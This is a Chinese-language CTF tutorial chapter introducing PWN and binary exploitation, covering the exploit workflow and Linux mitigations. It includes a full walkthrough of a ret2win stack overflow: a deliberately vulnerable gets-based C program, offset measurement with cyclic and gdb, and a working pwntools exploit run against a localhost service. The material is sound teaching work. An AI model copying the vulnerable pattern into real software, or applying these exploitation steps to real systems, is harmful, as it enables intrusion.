---
chapter: PWN
section: PWN 与二进制漏洞利用导论
order: 301
tags:
  - CTF
  - PWN
publish: true
---

# P1 PWN 与二进制漏洞利用导论
## PWN & Binary Exploitation Introduction

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L1 筑基期 ｜ **前置要求**：[[R04-可执行文件格式ELF与PE|R04]] · [[R03-x86与x64汇编精要复习|R03]] · [[02-C语言与内存模型|通用基础 02 章]]
> **本章目标**：说清 PWN 题的形态与目标，给出利用链构建的五步流程和现代缓解机制全景；然后从编译一个带漏洞的程序开始，一步步做到控制执行流，复现第一个 ret2win。

## 1. PWN 是什么：从"读懂"到"控制"

逆向方向的出发点是"读懂"：[[R01-逆向工程与CTF竞赛生态导论|R01]] 建立的就是这个视角——拿到二进制，分析它做了什么。PWN 的出发点是"控制"：程序做什么已经被出题人写死，==目标是让程序执行你的意图==。

一道 PWN 题的标准配置是两部分：

- **附件**：一个带漏洞的二进制程序，常配套源码或 libc 文件；
- **远程服务**：比赛平台上有一个跑着同一程序的服务，用 `nc host port` 连上去交互。

目标是让这个程序执行你的意图——通常是 getshell（让程序交出一个可交互的 shell），或直接读出服务器上的 flag 文件。连上远程、发一份构造好的输入，程序不再走它原本的正常逻辑，而是转向你的意图，把 flag 打出来。

本地与远程的关系一句话：==附件和远程跑的是同一个程序==。本地把利用调通，远程只是换一种连接方式。pwntools 里两者是同一个接口的两个函数：`process('./vuln')` 起本地进程，`remote('host', port)` 连远程服务，收发数据的写法完全一样——5.6 会看到这条切换只改一行。附件常配一份 libc 文件，原因是远程服务器的 libc 版本与本地不一致时，函数地址对不上，要加载题目给的版本来跑，识别与匹配的方法 [[P03-ELF链接与延迟绑定|P3]] 展开。

> [!info]- 术语速查
> | 术语 | 含义 |
> | ---- | ---- |
> | exploit | 利用程序（脚本），本章末尾会写出第一个完整的 |
> | payload | exploit 发给目标程序的那份数据本身 |
> | shellcode | 一段机器码，功能通常是启动一个 shell |
> | gadget | 程序里现成的"几条指令 + ret"片段，ROP 链的基本单元（[[02-C语言与内存模型#5.2 节（section）与段（segment）\|02 章 5.2]] 提过这个词） |
> | getshell | 让程序交出 shell，此后输入的命令都会被执行 |
> | flag | 赛题答案，通常形如 `flag{...}`，拿到即得分 |

> [!info]- 名字的由来与赛题趋势
> PWN 源自 own（"拿下你的机器"）的拼写演变。难度分布上，入门赛事以本章这类栈题为主，进阶后是堆利用、格式化字符串、内核题；近年真题与真实世界场景结合越来越多（浏览器、虚拟机、容器逃逸）。各方向的入口见本章第 6 节。

## 2. 利用链构建的五步流程

不同 PWN 题的漏洞千差万别，解题流程却高度一致，拆成五步：

| 步骤 | 做什么 | 常用工具 | 展开章节 |
| ---- | ---- | ---- | ---- |
| 1. 查保护 | 看开了哪些缓解机制，划定能做什么 | `pwn checksec` | [[P04-Linux安全缓解机制\|P4]] 讲原理与绕过思路，[[P05-pwntools与GDB插件工具链\|P5]] 讲工具细节 |
| 2. 找漏洞点 | 反汇编 / 反编译，找危险函数或逻辑缺陷 | IDA / Ghidra、objdump、strings | [[R05-静态分析工具链IDA与Ghidra\|R05]]；危险函数清单 [[P02-前置基础C汇编与Linux\|P2]]；格式化字符串 [[P09-格式化字符串漏洞\|P9]]、整数缺陷 [[P10-整数溢出与off-by-one\|P10]] |
| 3. 算偏移 | 算出从输入位置到"控制点"的距离 | pwntools cyclic、GDB | [[P06-栈溢出原理与ret2win\|P6]] |
| 4. 构造利用链 | 把控制权引向目标：ret2win / ROP / shellcode | pwntools、ROPgadget、one_gadget | [[P06-栈溢出原理与ret2win\|P6]]、[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]、[[P08-ROP进阶与SROP\|P8]] |
| 5. 打远程 | 连服务、发数据、收 flag | pwntools remote、nc | [[P05-pwntools与GDB插件工具链\|P5]] 标准化 exploit 骨架；libc 匹配 [[P03-ELF链接与延迟绑定\|P3]] |

三点说明：

- ==五步是骨架，不是单向流水线==。难度上去之后会出现循环：先利用一次拿到一个泄露值（走一遍 3–4 步），再拿泄露值构造第二轮利用（[[P09-格式化字符串漏洞|P9]]、[[P11-Canary绕过与GOT攻击|P11]] 都是这种形态）。
- 第 1 步的产出直接约束第 4 步的选型：NX 开着就不能注入 shellcode，PIE 开着就不能写死地址——机制与选型的对应表在 [[P04-Linux安全缓解机制|P4]] 列出。
- 本章第 5 节把五步完整走一遍，每一步都停在能看清原理的粒度。

## 3. 现代缓解机制全景

[[02-C语言与内存模型#2.2 PWN 学习必会的编译选项|通用基础 02 章]]列过这组机制的定义与编译选项，这里补做题视角：每个机制一句话"防什么"、在题目里怎么认出来。原理与绕过细节 [[P04-Linux安全缓解机制|P4]] 展开。

| 机制 | 防什么 | 题目里的迹象 | 详讲 |
| ---- | ---- | ---- | ---- |
| NX / DEP | 栈、堆等数据页不可执行，注入的 shellcode 跑不起来 | checksec 报 `NX enabled`；程序头里 GNU_STACK 段无 E 权限 | [[P04-Linux安全缓解机制\|P4]] |
| Stack Canary | 在局部变量与返回地址之间放随机值，返回前检查；栈溢出直接覆盖返回地址会先触发报错 | checksec 报 `Canary found`；符号表里有 `__stack_chk_fail` | [[P04-Linux安全缓解机制\|P4]]；绕过在 [[P11-Canary绕过与GOT攻击\|P11]] |
| ASLR | 每次运行随机化栈、堆、libc 等区域的装载基址 | 运行间地址不同（[[R04-可执行文件格式ELF与PE#1.7 静态还是动态：file 与 ldd\|R04 1.7]] 的 ldd 输出里每次都变） | [[P04-Linux安全缓解机制\|P4]] |
| PIE | 程序自身的代码、数据基址也随机化 | checksec 报 `PIE enabled`；`readelf -h` 里 `e_type` 为 `DYN` | [[P04-Linux安全缓解机制\|P4]] |
| RELRO | 把 GOT 等重定位区域设为只读，防改写 GOT 劫持调用 | checksec 报 `Full/Partial RELRO` | GOT 与延迟绑定背景在 [[P03-ELF链接与延迟绑定\|P3]]，机制细节 [[P04-Linux安全缓解机制\|P4]] |

> [!warning] ASLR 和 PIE 不是一回事
> ASLR 是==操作系统层面==的随机化，不是编译选项；PIE 是==编译产物的属性==，两者配合才让程序地址全面随机。[[02-C语言与内存模型#2.2 PWN 学习必会的编译选项|02 章]]把它们分列在"系统级保护"与"编译选项"两栏。

> [!info]- checksec 背后在看什么，以及输出里的 SHSTK / IBT
> checksec 不是黑盒，它读的就是 [[R04-可执行文件格式ELF与PE#1.1 链接视图与执行视图：两套目录|R04 第 1 节]]的程序头表：NX 看 GNU_STACK 段权限，RELRO 看 GNU_RELRO 段，PIE 看 `e_type`，Canary 看符号表里有没有 `__stack_chk_fail`。5.2 的输出还有两行 `SHSTK` / `IBT`：这是 gcc 默认开启的 CET 控制流加固属性（[[R04-可执行文件格式ELF与PE#1.6 入口点：_start 与 main|R04 1.6]]反汇编里那条 endbr64 就是它的产物），对入门栈题没有影响，[[P04-Linux安全缓解机制|P4]] 展开。此外还有 FORTIFY_SOURCE（给危险函数插入边界检查、替换成 `_chk` 后缀的安全版本）等更细的加固，同样放 P4。

## 4. 危险函数初览：gets 为什么危险

PWN 漏洞的入口绝大多数是一段"长度不受控的写入"。最小的例子两行就够：

```c
char buf[16];
gets(buf);   /* buf 有多大，函数不知道 */
```

`gets` 的原型是 `char *gets(char *s)`：从标准输入读字符存进 `s`，==读到换行符才停==，结尾补一个 `\0`。参数里没有缓冲区大小，返回值也不是长度——==这个函数拿不到任何边界信息，想检查也无从检查==。敲 10 个字符没事，敲 100 个字符，多出来的就顺着栈往高地址一路写过去：先盖掉 `buf` 后面的局部变量，再盖掉保存的 `rbp`，最后盖到返回地址（栈向低地址生长、写入向高地址走，[[02-C语言与内存模型#5.3 栈向低地址增长|02 章 5.3]]讲过这条物理基础）。5.4 的崩溃现场就是它造成的。

[[02-C语言与内存模型#8. 字符串与危险函数|通用基础 02 章第 8 节]]列过 `gets`、`strcpy`、`sprintf`、`scanf("%s")`、`memcpy` 这族函数的完整清单和判断方法（看输入长度是否受控，而不是只看函数名），不重复展开；完整清单与安全替代写法 [[P02-前置基础C汇编与Linux|P2]] 汇总。

现代工具链对 `gets` 的态度直接写在编译输出里，5.1 就能看到：链接器明确警告它危险，C11 起它被移出语言标准、新版头文件不再提供声明——但 libc 里的实现仍在，赛题附件里照样能用。

## 5. 实战：从编译到 getshell 的第一个 ret2win

本节把第 2 节的五步完整走一遍。目标程序自己写：一个带 `gets` 溢出漏洞、又内含一个"永远不该被调用"的 `win` 函数。==让程序跳进 win，就是本章的利用目标==，这类题叫 ret2win（return to win）。

### 5.1 漏洞程序与编译

```c
/* vuln.c —— ret2win 演示程序（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);   /* gets 已移出 C11 标准，新版头文件不再声明；libc 里实现仍在，手动补声明 */

void win(void) {
    char flag[64];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("[win] flag.txt not found");
        return;
    }
    fgets(flag, sizeof(flag), f);
    puts(flag);
    fclose(f);
}

void vuln(void) {
    char buf[64];
    printf("name> ");
    gets(buf);             /* 漏洞点：64 字节的 buf，gets 写多长都收 */
}

int main(void) {
    setbuf(stdout, NULL);  /* 关输出缓冲，保证提示符在读取输入前打印出来 */
    vuln();
    puts("bye");
    return 0;
}
```

逻辑上 `main` 只调用 `vuln`，`win` 没有任何调用者——正常执行永远到不了它。同目录放一个 `flag.txt`，充当"服务器上的 flag"：

```bash
echo 'flag{ret2win_first_blood}' > flag.txt
```

编译。入门程序把碍事的缓解机制逐个关掉，参数逐条见折叠框：

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector vuln.c -o vuln
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccq1rnzn.o: in function `vuln':
vuln.c:(.text+0x84): warning: the `gets' function is dangerous and should not be used.
```

==警告不是错误，二进制照常生成==——但漏洞点已经被工具链点名。`file` 确认产物：

```bash
file vuln
```

输出：

```
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6b7941a39f5c57074c5d46a2c9b6c50059e1408e, for GNU/Linux 3.2.0, not stripped
```

64 位 x86-64、动态链接、非 PIE 的可执行文件（`ELF 64-bit LSB executable`，不是 `pie executable`），符号未删。ELF 字段的读法 [[R04-可执行文件格式ELF与PE|R04]]整章都在讲。

> [!info]- 编译参数逐条说明
> | 参数 | 作用 |
> | ---- | ---- |
> | `-O0` | 关优化，汇编与源码逐行对应，[[R03-x86与x64汇编精要复习#1. 本章范围与编译基线\|R03 第 1 节]]的编译基线 |
> | `-fno-pie` / `-no-pie` | 编译、链接两层都关 PIE，程序固定装载在 0x400000 一带，地址可以写死 |
> | `-fno-stack-protector` | 关 Canary，溢出直达返回地址，不会被 `__stack_chk_fail` 拦下 |
>
> 本章用不到 `-z execstack`：它把栈变成可执行页（关 NX），是给注入 shellcode 准备的，[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 讲 shellcode 时才需要。==赛题不会替你关保护==：现代题目通常全部默认开启，[[02-C语言与内存模型#2.2 PWN 学习必会的编译选项|02 章]]的 warning 提过这条，[[P04-Linux安全缓解机制|P4]] 学完保护原理后要回到全保护环境练习。

### 5.2 第一步：checksec 查保护

```bash
pwn checksec vuln
```

输出：

```
[*] '/home/hua/p1/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

逐行判读：64 位小端；Partial RELRO（GOT 仍可写，改 GOT 类思路有入口，背景在 [[P03-ELF链接与延迟绑定|P3]]）；==Canary 关==，栈溢出可以直达返回地址；NX 开，栈上数据不可执行，注入 shellcode 这条路堵死；==PIE 关==，程序基址固定 0x400000，`win` 的地址是一个写进 payload 就能用的常量；SHSTK / IBT 是 CET 属性（第 3 节折叠框）；未 strip，下一步能直接查符号。

这一步的全部产出是一张"能做什么、不能做什么"的清单：==NX 堵住 shellcode，PIE 关闭成全 ret2win==。

### 5.3 第二步：找漏洞点与目标地址

程序未 strip，符号表直接给出三个用户函数的地址：

```bash
nm vuln | grep -E ' T (main|vuln|win)$'
```

输出：

```
0000000000401281 T main
0000000000401257 T vuln
00000000004011f6 T win
```

`win` 在 0x4011f6。真实赛题多半 stripped，定位函数的通用方法（关键字符串交叉引用、`_start` 找 main）[[R04-可执行文件格式ELF与PE#2.2 符号已删，地址还在|R04 2.2]] 讲过，IDA 里的同款流程是 [[R05-静态分析工具链IDA与Ghidra|R05]]的主题。

再反汇编 `vuln` 确认漏洞点（x86-64 Linux / System V AMD64 ABI，Intel 语法）：

```bash
objdump -d -M intel vuln --start-address=0x401257 --stop-address=0x401281
```

输出：

```
0000000000401257 <vuln>:
  401257:	f3 0f 1e fa          	endbr64
  40125b:	55                   	push   rbp
  40125c:	48 89 e5             	mov    rbp,rsp
  40125f:	48 83 ec 40          	sub    rsp,0x40
  401263:	bf 28 20 40 00       	mov    edi,0x402028
  401268:	b8 00 00 00 00       	mov    eax,0x0
  40126d:	e8 5e fe ff ff       	call   4010d0 <printf@plt>
  401272:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  401276:	48 89 c7             	mov    rdi,rax
  401279:	e8 72 fe ff ff       	call   4010f0 <gets@plt>
  40127e:	90                   	nop
  40127f:	c9                   	leave
  401280:	c3                   	ret
```

序言尾声的形状 [[R03-x86与x64汇编精要复习|R03]]整理过，这里读三条关键指令：`lea rax,[rbp-0x40]` 把 `buf` 的地址装进第一参数寄存器 rdi——==buf 位于 rbp-0x40==；`call gets@plt` 就是第 4 节的危险函数；结尾 `leave; ret` 里的 ==ret 会把 rsp 指向的 8 字节弹进 rip 并跳过去==——控制执行流的入口就在这条指令。

### 5.4 第三步：cyclic 算偏移

payload 要回答一个数字问题：==从 buf 的起点到返回地址，隔多少字节？== 答案决定填充多长。

手算从 5.3 的栈帧就能推：`buf` 占 64 字节（rbp-0x40 到 rbp），再盖掉保存的 rbp 用 8 字节，到返回地址共 64 + 8 = 72。但实际布局会随编译器、优化等级、变量数量、对齐填充变化（[[02-C语言与内存模型#6.3 一个可以背下来的栈帧|02 章 6.3]]的 warning），==做题一律用模式串量==。

pwntools 的 `cyclic` 生成这样的串：每 4 字节一组（aaaabaaacaaadaaa…），==全串任意位置的 8 字节内容都唯一==。把串喂进程序，程序崩在"返回地址变成模式串"的现场；从崩溃现场读回那 8 个字节，交给工具反查它在串里的起始位置——偏移就有了。

生成 200 字节模式串存进文件（80 字节的目标足够覆盖，还有富余）：

```bash
pwn cyclic 200 > pattern.txt
```

gdb 批处理跑一遍：命令写进文件，`-batch` 表示执行完自动退出。

```
# gdb.cmds
set confirm off
run
info registers rip rsp
x/gx $rsp
quit
```

```bash
gdb -q -batch -x gdb.cmds ./vuln < pattern.txt
```

输出：

```
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
name> 
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401280 in vuln ()
rip            0x401280            0x401280 <vuln+41>
rsp            0x7fffffffe168      0x7fffffffe168
0x7fffffffe168:	0x6161617461616173
```

读这个现场：

- 程序崩在 0x401280——正是 5.3 反汇编末尾那条 `ret`。ret 要跳去的目标 0x6161617461616173 是一串 ASCII 字节，不是合法代码地址，CPU 触发段错误，异常停在 `ret` 指令本身；
- ==返回地址槽里现在就是模式串的内容==：rsp 指着这个槽，`x/gx $rsp` 显示槽里是 0x6161617461616173（按小端还原成 ASCII 是 "saaataaa"，见下方折叠框）。

把这 8 字节交给 `pwn cyclic -l` 反查：

```bash
pwn cyclic -l 0x6161617461616173
```

输出：

```
72
```

==模式串量出来的 72，与手算的 64 + 8 一致==——这就是 payload 要填的偏移。栈帧与 payload 的对应：

```asm
; vuln 栈帧（-O0，x86-64 Linux）——payload 从 buf 起向高地址覆盖
;   rbp-0x40  buf[64]      payload 第 1–64 字节
;   rbp+0x00  保存的 rbp   第 65–72 字节
;   rbp+0x08  返回地址     第 73–80 字节 ← 第 73 字节起换成 win 的地址
```

> [!info]- 0x6161617461616173 为什么能反查出位置
> cyclic 的字符表是 a–p，每 4 字节一组、组内首字母按序递增：第 0 组 `aaaa`、第 1 组 `baaa`……第 18 组（字节 72–75）是 `saaa`、第 19 组（字节 76–79）是 `taaa`。返回地址槽里的 8 个字节按小端读出正是 `saaataaa`，`cyclic -l` 在全串中找到这段内容的首次出现位置，就是 72。==模式串的每个字节都携带位置信息==——换成全填 `A`，盖坏了也不知道坏在哪一字节。

### 5.5 第四步：构造利用链

利用链在这里只有一节：==72 字节填充 + 8 字节 win 地址==。返回地址槽被填成 0x4011f6 之后，`vuln` 的 `ret` 弹出的就是 `win` 的地址，控制流随之进入 `win`。

两个细节：

- 地址要用 `p64()` 打包成 8 字节再拼接。x86-64 是小端序（[[02-C语言与内存模型#7.2 大小端|02 章 7.2]]），`p64(0x4011f6)` 产出 `f6 11 40 00 00 00 00 00`，手拼字节串很容易搞反。
- `recvuntil(b'name> ')` 先等提示符出现再发数据，保证交互同步。不加偶尔也能跑通，但输出时机一变就会乱。

```python
#!/usr/bin/env python3
# exp.py —— 第一个 ret2win exploit
from pwn import *

context.arch = 'amd64'      # 64 位程序，p64 打包 8 字节地址
context.log_level = 'info'

OFFSET = 72                 # 5.4 算出的偏移
WIN    = 0x4011f6           # 5.3 nm 查到的 win 地址，以自己编译的产物为准

io = process('./vuln')
io.recvuntil(b'name> ')
io.sendline(b'A' * OFFSET + p64(WIN))

flag = io.recvline().strip()
success(flag.decode())
io.close()
```

跑：

```bash
python3 exp.py
```

输出：

```
[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 601
[+] flag{ret2win_first_blood}
[*] Stopped process './vuln' (pid 601)
```

`win` 执行了它有生以来第一次被调用：打开 flag.txt、打印内容。之后 `win` 自己的 `ret` 弹走的是 payload 之外没人控制的旧数据，程序随即崩溃退出——==flag 已经到手，收尾的崩溃不影响结果==。

### 5.6 第五步：打远程

把同一个程序跑成 TCP 服务，就得到"远程"。赛场上这个服务由平台提供，`nc host port` 连接；本地演练用十行 Python 顶替——每来一个连接就 fork 一个子进程，把套接字接上标准输入输出再执行 vuln，这正是 CTF 远程服务的最小实现：

```python
#!/usr/bin/env python3
# serve.py —— 把 ./vuln 跑成本地 TCP 服务（127.0.0.1:1337）
import os, socket

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', 1337))
s.listen(5)
while True:
    conn, _ = s.accept()
    if os.fork() == 0:            # 子进程：套接字接上标准输入输出，再把自己换成 vuln
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        os.execv('./vuln', ['./vuln'])
    conn.close()                  # 父进程继续等下一个连接
```

先用 nc 手动打一次，体会"远程也就是连上去发数据"。payload.bin 是 72 个 A 加 8 字节地址（生成命令见下方折叠框）：

```bash
python3 serve.py &
nc -w 1 127.0.0.1 1337 < payload.bin
```

输出：

```
name> flag{ret2win_first_blood}
```

提示符和 flag 从网络另一端回来，利用成功。交互式敲键盘也能走这一遍，但==二进制地址敲不进键盘==，所以实战里发 payload 一律用脚本。回到 exploit——==改一行就能从本地切到远程==：把 exp.py 里的 `process('./vuln')` 换成 `remote('127.0.0.1', 1337)`（存成 exp_remote.py）：

```bash
python3 exp_remote.py
```

输出：

```
[x] Opening connection to 127.0.0.1 on port 1337
[x] Opening connection to 127.0.0.1 on port 1337: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] flag{ret2win_first_blood}
[*] Closed connection to 127.0.0.1 port 1337
```

同一个 exploit，本地 process 与远程 remote 两种形态都拿到 flag——第 1 节说的"附件与远程是同一个程序"就体现在这里。真实赛题的差别只有两点：host 和 port 由平台给出；==远程服务器的 libc 与本地不同==，涉及地址计算的题要用题目附带的 libc 文件对齐版本，识别与匹配 [[P03-ELF链接与延迟绑定|P3]] 展开。

> [!info]- payload.bin 怎么生成
> ```bash
> python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x4011f6).to_bytes(8,'little') + b'\n')" > payload.bin
> ```
> 与 exp.py 的 payload 完全等价：72 字节填充，加一个按小端打包的 win 地址，末尾一个换行喂给 gets。

> [!info]- win 带参数怎么办：从 ret2win 到 ROP
> 本章的 `win` 无参，把地址写进返回地址槽就够。若 `win` 需要参数（比如 `win("cat flag")`），x64 的第一个参数走 rdi 寄存器（System V AMD64 ABI），==不能像 32 位那样把参数排在栈上==。办法是在程序里找一段 `pop rdi; ret`：让 ret 先落到这里，`pop rdi` 把栈上的字符串地址弹进 rdi，再 ret 进 `win`。这种"以 ret 串起来的小指令片段"就是 gadget，串起来的完整链就是 ROP；搜 gadget 的工具（ROPgadget、ropper）在 [[P05-pwntools与GDB插件工具链|P5]] 介绍，带参 win 的栈布局与完整构造在 [[P06-栈溢出原理与ret2win|P6]]、[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 展开。

## 6. 题目分类概览

| 类型 | 一句话特征 | 展开章节 |
| ---- | ---- | ---- |
| 栈 | 溢出栈上缓冲区，覆盖返回地址或保存的数据——本章的 ret2win 是最小例子 | [[P06-栈溢出原理与ret2win\|P6]]、[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]、[[P08-ROP进阶与SROP\|P8]]；整数缺陷诱发 [[P10-整数溢出与off-by-one\|P10]]；Canary 对抗 [[P11-Canary绕过与GOT攻击\|P11]] |
| 格式化字符串 | `printf(user_input)` 把用户输入当格式串，获得任意地址读写 | [[P09-格式化字符串漏洞\|P9]] |
| 堆 | 破坏 malloc/free 的管理结构，让分配器把内存交到手上 | P12–P17 |
| 内核 | 漏洞在内核模块 / 驱动里，目标是提权或逃逸 | P18 |

入门期只在栈这一条线上推进，[[P06-栈溢出原理与ret2win|P6]] 起逐章展开。其余类型的原则与本章相同——查保护、找漏洞、算偏移、构造、打远程，换的只是"构造"一步的手法。

## 7. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 编译报 `implicit declaration of function 'gets'` | `gets` 已移出 C11 标准，新版编译器在新默认标准下对隐式声明直接报错。源文件开头手动补 `char *gets(char *s);`（[[02-C语言与内存模型#10. 常见问题\|02 章常见问题]]记过这条） |
| 链接警告 `the 'gets' function is dangerous` | 警告不阻断编译，产物照常生成；它同时是找漏洞点的线索（5.1） |
| `pwn cyclic -l` 报 pattern not found | 反查的值不是模式串里完整的 8 字节：可能取漏了，也可能取错了位置。确认取的是返回地址槽那 8 字节（5.4 的 `x/gx $rsp`） |
| exploit 发完直接 EOF，没看到 flag | 偏移或地址不对，程序崩在半路。检查地址是否用 `p64` 打包、是否与 `nm` 输出一致；再到 gdb 里确认 `ret` 弹出的值 |
| 程序跳进了 win 却崩在函数深处 | 常见于 `win` 里调用 `system` 一族函数：x64 要求 call 瞬间栈按 16 字节对齐，ret2win 直跳进来会差 8 字节。在链首多垫一个 `ret` gadget，[[P06-栈溢出原理与ret2win\|P6]] 详讲 |
| 本地能通，远程拿不到 flag | 本地与远程的 libc 版本不一致，函数地址对不上。题目附带 libc 就加载附件运行（环境配置 [[P02-前置基础C汇编与Linux\|P2]]，识别匹配 [[P03-ELF链接与延迟绑定\|P3]]） |
| checksec 显示 Canary enabled，溢出后报 `*** stack smashing detected ***` | Canary 拦下了覆盖，程序被终止。先泄露或绕过金丝雀再利用，方法在 [[P11-Canary绕过与GOT攻击\|P11]] |
